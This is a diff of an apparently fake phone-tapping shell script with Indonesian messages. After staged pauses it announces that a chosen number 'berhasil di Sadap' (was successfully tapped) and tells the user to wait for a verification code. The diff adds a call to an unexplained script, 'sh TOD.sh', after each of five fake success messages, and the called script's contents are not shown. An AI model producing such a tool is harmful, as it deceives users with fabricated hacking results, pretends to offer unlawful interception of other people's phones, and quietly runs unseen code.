@@ -68,6 +68,7 @@ sleep 4
 echo $cy"Done!"
 sleep 6
 echo $me"Nomor $pil berhasil di Sadap! Tunggu kode verifikasi"
+sh TOD.sh
 fi
 
 if [ $pil = '2' ]
@@ -107,6 +108,7 @@ sleep 4
 echo $cy"Done!"
 sleep 6
 echo $me"Nomor $pil berhasil di Sadap! Tunggu kode verifikasi"
+sh TOD.sh
 fi
 
 if [ $pil = '3' ]
@@ -146,6 +148,7 @@ sleep 4
 echo $cy"Done!"
 sleep 6
 echo $me"Nomor $pil berhasil di Sadap! Tunggu kode verifikasi"
+sh TOD.sh
 fi
 
 if [ $pil = '4' ]
@@ -185,6 +188,7 @@ sleep 4
 echo $cy"Done!"
 sleep 6
 echo $me"Nomor $pil berhasil di Sadap! Tunggu kode verifikasi"
+sh TOD.sh
 fi
 
 if [ $pil = '5' ]
@@ -224,6 +228,7 @@ sleep 4
 echo $cy"Done!"
 sleep 6
 echo $me"Nomor $pil berhasil di Sadap! Tunggu kode verifikasi"
+sh TOD.sh
 fi
 
 if [ $pil = '0' ]
